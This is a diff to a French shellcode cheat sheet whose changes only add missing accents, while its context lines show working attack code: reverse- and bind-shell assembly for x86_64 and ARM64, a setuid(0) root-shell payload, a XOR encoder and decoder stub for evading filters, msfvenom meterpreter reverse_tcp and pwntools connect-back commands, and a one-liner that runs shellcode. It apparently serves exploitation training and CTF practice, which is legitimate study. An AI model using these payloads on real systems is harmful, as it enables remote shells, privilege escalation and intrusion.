@@ -54,7 +54,7 @@ Shellcode : 4831f65648bf2f62696e2f2f736857 4889e74831d26a3b580f05
 
 ### 1.3 Reverse shell TCP (environ 74 bytes)
 
-Se connecte a un attaquant. Remplacer IP/port.
+Se connecte à un attaquant. Remplacer IP/port.
 
 ```nasm
 ; Reverse shell - connect back to LHOST:LPORT
@@ -111,7 +111,7 @@ _start:
 
 ### 1.4 Bind shell TCP (environ 100 bytes)
 
-Ouvre un port en ecoute. Utile quand la cible n'a pas de firewall sortant.
+Ouvre un port en écoute. Utile quand la cible n'a pas de firewall sortant.
 
 ```nasm
 section .text
@@ -203,7 +203,7 @@ _start:
     mov ch, 0x10             ; rcx = 0x1000 (4096) sans NULL bytes
     sub rsp, rcx             ; buffer sur la stack
     mov rsi, rsp
-    mov dx, 0x0fff          ; count = 4095 (evite null)
+    mov dx, 0x0fff          ; count = 4095 (évite null)
     xor rax, rax            ; read syscall = 0
     syscall
 
@@ -225,7 +225,7 @@ _start:
 
 ### 1.6 setuid(0) + execve /bin/sh (37 bytes)
 
-Utile apres exploitation d'un binaire SUID pour obtenir un shell root.
+Utile après exploitation d'un binaire SUID pour obtenir un shell root.
 
 ```nasm
 section .text
@@ -252,12 +252,12 @@ _start:
 
 ### 1.7 Write message + exit (stub template)
 
-Template de base pour ecrire un message et sortir proprement.
+Template de base pour écrire un message et sortir proprement.
 
 ```nasm
 section .text
 _start:
-    ;--- Construire la chaine sur la stack ---
+    ;--- Construire la chaîne sur la stack ---
     xor rbx, rbx
     mov bx, 'y!'
     push rbx
@@ -328,7 +328,7 @@ _start:
     xchg edi, eax            ; sockfd
 
     ; connect(sockfd, addr, 16)
-    ; IP 127.0.0.1 via NOT (evite les NULL bytes)
+    ; IP 127.0.0.1 via NOT (évite les NULL bytes)
     mov ebx, ~0x0100007f     ; NOT de l'IP (modifier ici)
     not ebx
     push ebx
@@ -439,7 +439,7 @@ _start:
 
 ## 3. Linux ARM64 (aarch64)
 
-> Syscalls via `svc #0`. Arguments dans `x0`-`x5`, numero dans `x8`.
+> Syscalls via `svc #0`. Arguments dans `x0`-`x5`, numéro dans `x8`.
 
 ### 3.1 execve /bin/sh (44 bytes)
 
@@ -452,13 +452,13 @@ _start:
     mov x1, xzr              // argv = NULL
     adr x0, shell             // x0 = &"/bin/sh"
     mov x8, #221              // execve syscall
-    svc #0x1337              // imm ignore par le kernel, evite NULL bytes
+    svc #0x1337              // imm ignoré par le kernel, évite NULL bytes
 
 shell:
     .ascii "/bin/sh\0"
 ```
 
-> **Note** : contient un NULL byte dans la chaine. Pour un shellcode injectable,
+> **Note** : contient un NULL byte dans la chaîne. Pour un shellcode injectable,
 > utiliser la technique XOR ou la construction sur la stack.
 
 ### 3.2 execve /bin/sh - null-free (environ 48 bytes)
@@ -479,7 +479,7 @@ _start:
     mov x0, sp
 
     mov x8, #221              // execve
-    svc #0x1337              // imm ignore par le kernel, evite NULL bytes
+    svc #0x1337              // imm ignoré par le kernel, évite NULL bytes
 ```
 
 ### 3.3 Reverse shell TCP
@@ -493,7 +493,7 @@ _start:
     mov x1, #1
     mov x2, xzr
     mov x8, #198              // socket
-    svc #0x1337              // imm ignore par le kernel, evite NULL bytes
+    svc #0x1337              // imm ignoré par le kernel, évite NULL bytes
     mov x12, x0               // save sockfd
 
     // connect - struct sockaddr_in sur la stack
@@ -508,7 +508,7 @@ _start:
     mov x1, sp
     mov x2, #16
     mov x8, #203              // connect
-    svc #0x1337              // imm ignore par le kernel, evite NULL bytes
+    svc #0x1337              // imm ignoré par le kernel, évite NULL bytes
 
     // dup2 loop
     mov x1, #3
@@ -516,7 +516,7 @@ dup_loop:
     sub x1, x1, #1
     mov x0, x12
     mov x8, #24               // dup3 (on aarch64)
-    svc #0x1337              // imm ignore par le kernel, evite NULL bytes
+    svc #0x1337              // imm ignoré par le kernel, évite NULL bytes
     cbnz x1, dup_loop
 
     // execve
@@ -529,14 +529,14 @@ dup_loop:
     str x3, [sp, #-16]!
     mov x0, sp
     mov x8, #221
-    svc #0x1337              // imm ignore par le kernel, evite NULL bytes
+    svc #0x1337              // imm ignoré par le kernel, évite NULL bytes
 ```
 
 ---
 
 ## 4. Linux ARM32
 
-> Syscalls via `svc #0`. Arguments dans `r0`-`r6`, numero dans `r7`.
+> Syscalls via `svc #0`. Arguments dans `r0`-`r6`, numéro dans `r7`.
 > Utiliser le mode Thumb pour des shellcodes plus compacts.
 
 ### 4.1 execve /bin/sh - Thumb mode (27 bytes)
@@ -559,20 +559,20 @@ thumb:
     svc #1
 
 shell:
-    .ascii "/bin/shX"         // X sera remplace par \0
+    .ascii "/bin/shX"         // X sera remplacé par \0
 ```
 
 ---
 
 ## 5. Windows x64
 
-> Syscalls indirects via `ntdll.dll`. Plus complexe que Linux car les numeros changent entre versions.
+> Syscalls indirects via `ntdll.dll`. Plus complexe que Linux car les numéros changent entre versions.
 > En pratique, on appelle les API Win32 via le PEB/IAT.
 
 ### 5.1 WinExec("calc.exe") - concept
 
 ```nasm
-; Pseudo-code - necessite de resoudre les adresses dynamiquement
+; Pseudo-code - nécessite de résoudre les adresses dynamiquement
 ; via le PEB -> InLoadOrderModuleList -> kernel32.dll -> GetProcAddress
 
 ; 1. Trouver kernel32.dll base via PEB
@@ -587,12 +587,12 @@ shell:
 ; 3. Appeler WinExec("calc.exe", 0)
 ```
 
-> Les shellcodes Windows sont plus longs car il faut resoudre les adresses API
-> dynamiquement. Utiliser `msfvenom` pour les generer en pratique.
+> Les shellcodes Windows sont plus longs car il faut résoudre les adresses API
+> dynamiquement. Utiliser `msfvenom` pour les générer en pratique.
 
 ---
 
-## 6. Generation automatique
+## 6. Génération automatique
 
 ### 6.1 pwntools shellcraft
 
@@ -603,18 +603,18 @@ pwn shellcraft -l 'i386.linux'
 pwn shellcraft -l 'arm.linux'
 pwn shellcraft -l 'aarch64.linux'
 
-# Generer et afficher le code ASM
+# Générer et afficher le code ASM
 pwn shellcraft amd64.linux.sh
 pwn shellcraft amd64.linux.connect 127.0.0.1 4444
 pwn shellcraft i386.linux.sh
 
-# Generer le shellcode hex
+# Générer le shellcode hex
 pwn shellcraft amd64.linux.sh -f hex
 
-# Executer directement
+# Exécuter directement
 pwn shellcraft amd64.linux.sh -r
 
-# Enchainer des shellcodes
+# Enchaîner des shellcodes
 pwn shellcraft amd64.linux.setreuid 0 -- amd64.linux.sh
 ```
 
@@ -649,29 +649,29 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f h
 # --- Options utiles ---
 # -f hex|raw|python|c|elf|exe    : format de sortie
 # -e x64/xor                     : encodage (bypass basique)
-# -b '\x00'                      : bad chars a eviter
+# -b '\x00'                      : bad chars à éviter
 # -n 16                          : NOP sled de 16 bytes
 # --smallest                     : optimiser la taille
 ```
 
 ---
 
-## 7. Encodage et evasion basique
+## 7. Encodage et évasion basique
 
 ### 7.1 XOR encoder (Python)
 
 ```python
 #!/usr/bin/python3
-"""Encode un shellcode avec XOR pour eviter les bad chars."""
+"""Encode un shellcode avec XOR pour éviter les bad chars."""
 import sys
 
 def xor_encode(shellcode_hex, key):
     sc = bytes.fromhex(shellcode_hex)
     encoded = bytes([b ^ key for b in sc])
 
-    # Verifier que la cle elle-meme ne produit pas de bad char
+    # Vérifier que la clé elle-même ne produit pas de bad char
     if b'\x00' in encoded:
-        print(f"[!] La cle 0x{key:02x} produit des NULL bytes, essayer une autre cle")
+        print(f"[!] La clé 0x{key:02x} produit des NULL bytes, essayer une autre clé")
         return None
 
     print(f"[+] Original  : {sc.hex()}")
@@ -688,9 +688,9 @@ if __name__ == "__main__":
     xor_encode(sys.argv[1], int(sys.argv[2], 16))
 ```
 
-### 7.2 Stub decodeur XOR (x86_64)
+### 7.2 Stub décodeur XOR (x86_64)
 
-A prependre au shellcode encode :
+À prépendre au shellcode encodé :
 
 ```nasm
 section .text
@@ -703,24 +703,24 @@ decoder:
     mov cl, SHELLCODE_LEN    ; longueur (< 256)
 
 decode_loop:
-    xor byte [rsi], XOR_KEY  ; cle XOR
+    xor byte [rsi], XOR_KEY  ; clé XOR
     inc rsi
     loop decode_loop
 
-    jmp get_shellcode + 5    ; sauter au shellcode decode
+    jmp get_shellcode + 5    ; sauter au shellcode décodé
 
 get_shellcode:
     call decoder
-    ; Le shellcode encode suit ici
+    ; Le shellcode encodé suit ici
 ```
 
 ---
 
-## 8. Numeros de syscalls - reference rapide
+## 8. Numéros de syscalls - référence rapide
 
 ### Linux x86_64
 
-| Syscall | Numero (`rax`) | `rdi` | `rsi` | `rdx` |
+| Syscall | Numéro (`rax`) | `rdi` | `rsi` | `rdx` |
 |---------|---------------|-------|-------|-------|
 | read | 0 | fd | buf | count |
 | write | 1 | fd | buf | count |
@@ -743,7 +743,7 @@ get_shellcode:
 
 ### Linux x86 (i386)
 
-| Syscall | Numero (`eax`) | `ebx` | `ecx` | `edx` |
+| Syscall | Numéro (`eax`) | `ebx` | `ecx` | `edx` |
 |---------|---------------|-------|-------|-------|
 | exit | 1 | code | | |
 | fork | 2 | | | |
@@ -760,22 +760,22 @@ get_shellcode:
 
 ## 9. Ressources externes
 
-### Bases de donnees de shellcodes
+### Bases de données de shellcodes
 
 | Ressource | URL | Description |
 |-----------|-----|-------------|
-| **Shell-Storm** | http://shell-storm.org/shellcode/ | Base de donnees de shellcodes multi-arch |
-| **Exploit-DB Shellcodes** | https://www.exploit-db.com/shellcodes | Shellcodes classes par plateforme |
+| **Shell-Storm** | http://shell-storm.org/shellcode/ | Base de données de shellcodes multi-arch |
+| **Exploit-DB Shellcodes** | https://www.exploit-db.com/shellcodes | Shellcodes classés par plateforme |
 | **Packet Storm** | https://packetstormsecurity.com/files/tags/shellcode/ | Collection de shellcodes |
 
 ### Outils en ligne
 
 | Outil | URL | Description |
 |-------|-----|-------------|
-| **Defuse Online x86 Assembler** | https://defuse.ca/online-x86-assembler.htm | Assembler/desassembler en ligne |
-| **Godbolt Compiler Explorer** | https://godbolt.org/ | Voir le code ASM genere par un compilateur |
+| **Defuse Online x86 Assembler** | https://defuse.ca/online-x86-assembler.htm | Assembler/désassembler en ligne |
+| **Godbolt Compiler Explorer** | https://godbolt.org/ | Voir le code ASM généré par un compilateur |
 | **Syscall Table** | https://syscalls.mebeim.net/ | Table interactive des syscalls Linux (toutes arch) |
-| **x86 Reference** | https://www.felixcloutier.com/x86/ | Reference complete des instructions x86 |
+| **x86 Reference** | https://www.felixcloutier.com/x86/ | Référence complète des instructions x86 |
 
 ### Documentation et apprentissage
 
@@ -784,8 +784,8 @@ get_shellcode:
 | **Linux Syscall Reference** | https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ | Table syscalls x86_64 |
 | **Shellcoding for Linux (Exploit-DB)** | https://www.exploit-db.com/docs/english/21013-shellcoding-in-linux.pdf | Tutoriel complet |
 | **pwntools docs** | https://docs.pwntools.com/en/stable/shellcraft.html | Documentation shellcraft |
-| **NASM Manual** | https://www.nasm.us/xdoc/2.16.03/html/nasmdoc0.html | Reference NASM officielle |
-| **Intel x86 Manuals** | https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html | Reference Intel officielle |
+| **NASM Manual** | https://www.nasm.us/xdoc/2.16.03/html/nasmdoc0.html | Référence NASM officielle |
+| **Intel x86 Manuals** | https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html | Référence Intel officielle |
 
 ### Cheatsheets
 
@@ -800,7 +800,7 @@ get_shellcode:
 | Ressource | URL | Description |
 |-----------|-----|-------------|
 | **pwnable.kr** | http://pwnable.kr/ | Challenges exploitation/shellcoding |
-| **pwnable.tw** | https://pwnable.tw/ | Challenges exploitation avances |
+| **pwnable.tw** | https://pwnable.tw/ | Challenges exploitation avancés |
 | **Exploit Education** | https://exploit.education/ | VMs pour apprendre l'exploitation |
 | **ROP Emporium** | https://ropemporium.com/ | Challenges ROP progressifs |
 | **HTB Academy** | https://academy.hackthebox.com/ | Module Intro to Assembly Language |
@@ -809,16 +809,16 @@ get_shellcode:
 
 ## 10. Tips pratiques
 
-### Verifier un shellcode rapidement
+### Vérifier un shellcode rapidement
 
 ```bash
 # Tester avec pwntools (une ligne)
 python3 -c "from pwn import *; context(os='linux',arch='amd64',log_level='error'); run_shellcode(unhex('SHELLCODE_HEX')).interactive()"
 
-# Desassembler pour review
+# Désassembler pour review
 pwn disasm 'SHELLCODE_HEX' -c 'amd64'
 
-# Verifier les bad chars
+# Vérifier les bad chars
 python3 -c "sc=bytes.fromhex('SHELLCODE_HEX'); bad=[hex(i) for i,b in enumerate(sc) if b==0]; print(f'NULL bytes at: {bad}' if bad else 'Clean!')"
 ```
 
@@ -832,7 +832,7 @@ python3 -c "import socket,struct; print(struct.pack('<I', int.from_bytes(socket.
 python3 -c "import struct; print(struct.pack('>H', 4444).hex())"
 ```
 
-### Chaine en hex pour push (little-endian, 8 bytes par registre)
+### Chaîne en hex pour push (little-endian, 8 bytes par registre)
 
 ```bash
 python3 -c "
